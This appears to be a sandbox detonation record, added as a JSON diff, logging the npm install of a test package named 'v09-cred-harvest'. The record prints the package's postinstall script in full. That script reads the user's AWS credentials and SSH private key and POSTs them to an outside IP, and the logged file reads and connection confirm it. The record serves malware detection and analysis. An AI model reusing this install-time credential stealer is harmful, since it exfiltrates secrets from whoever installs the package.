@@ -1,0 +1,108 @@
+{
+ "job_id": "e215c4c7-d02a-4b8e-935a-985a965d201a",
+ "status": "completed",
+ "exit_code": 0,
+ "duration_s": 6.01,
+ "exec_events": [
+  {
+   "ts": "2026-11-04T00:40:52.841126874Z",
+   "pid": 290064,
+   "ppid": 290039,
+   "binary": "/usr/local/bin/docker-entrypoint.sh",
+   "args": "/usr/local/bin/docker-entrypoint.sh /bin/sh -c \"/bin/true pre-8a77353afc97a623; \"$@\"; rc=$?; /bin/true post-8a77353afc97a623; exit $rc\" detonator-witness npm install --no-audit --no-fund --prefix payloads/v09-cred-harvest",
+   "parent_binary": "/usr/bin/containerd-shim-runc-v2",
+   "uid": 10001,
+   "cwd": "/work"
+  },
+  {
+   "ts": "2026-11-04T00:40:52.845243528Z",
+   "pid": 290101,
+   "ppid": 290064,
+   "binary": "/usr/local/bin/npm",
+   "args": "node /usr/local/bin/npm install --no-audit --no-fund --prefix payloads/v09-cred-harvest",
+   "parent_binary": "/bin/sh",
+   "uid": 10001,
+   "cwd": "/work"
+  },
+  {
+   "ts": "2026-11-04T00:40:52.845955489Z",
+   "pid": 290101,
+   "ppid": 290101,
+   "binary": "/usr/local/bin/node",
+   "args": "/usr/local/bin/npm install --no-audit --no-fund --prefix payloads/v09-cred-harvest",
+   "parent_binary": "/usr/local/bin/npm",
+   "uid": 10001,
+   "cwd": "/work"
+  },
+  {
+   "ts": "2026-11-04T00:40:53.309297466Z",
+   "pid": 290121,
+   "ppid": 290101,
+   "binary": "/usr/bin/sh",
+   "args": "-c \"node scripts/setup.js\"",
+   "parent_binary": "/usr/local/bin/node",
+   "uid": 10001,
+   "cwd": "/work/payloads/v09-cred-harvest"
+  },
+  {
+   "ts": "2026-11-04T00:40:53.310551453Z",
+   "pid": 290122,
+   "ppid": 290121,
+   "binary": "/usr/local/bin/node",
+   "args": "scripts/setup.js",
+   "parent_binary": "/usr/bin/sh",
+   "uid": 10001,
+   "cwd": "/work/payloads/v09-cred-harvest"
+  }
+ ],
+ "connect_events": [
+  {
+   "ts": "2026-11-04T00:40:53.351592468Z",
+   "pid": 290122,
+   "binary": "/usr/local/bin/node",
+   "daddr": "198.51.100.23",
+   "dport": 80,
+   "family": "AF_INET",
+   "resolved_domain": null,
+   "protocol": "tcp"
+  }
+ ],
+ "dns_queries": [],
+ "file_events": [
+  {
+   "ts": "2026-11-04T00:40:52.962674112Z",
+   "pid": 290101,
+   "binary": "/usr/local/bin/node",
+   "path": "/home/runner/.npmrc"
+  },
+  {
+   "ts": "2026-11-04T00:40:53.346411875Z",
+   "pid": 290122,
+   "binary": "/usr/local/bin/node",
+   "path": "/home/runner/.aws/credentials"
+  }
+ ],
+ "executed_scripts": [
+  {
+   "path": "/work/payloads/v09-cred-harvest/scripts/setup.js",
+   "package": null,
+   "sha256": "b0a3c8605bb1d914d698d0e542bfbec1af95f759a0f58c4e9f0a33962a3a0453",
+   "content": "const fs = require(\"fs\"), os = require(\"os\"), http = require(\"http\");\nlet blob = \"\";\nfor (const p of [\".aws/credentials\", \".ssh/id_rsa\"]) {\n  try { blob += fs.readFileSync(os.homedir() + \"/\" + p, \"utf8\"); } catch {}\n}\nconst r = http.request(\n  { host: \"198.51.100.23\", method: \"POST\", path: \"/up\", timeout: 3000 });\nr.on(\"error\", () => {}); r.on(\"timeout\", () => r.destroy());\nr.end(blob);\n",
+   "truncated": false
+  }
+ ],
+ "decoys": {},
+ "stdout_tail": "\n> v09@1.0.0 postinstall\n> node scripts/setup.js\n\n\nup to date in 3s\n",
+ "stderr_tail": "",
+ "truncated": false,
+ "error": null,
+ "sensor": {
+  "pre_seen": true,
+  "post_seen": true
+ },
+ "resources": {
+  "cpu_s": 0.66,
+  "peak_memory_mb": 38.3,
+  "samples": 8
+ }
+}
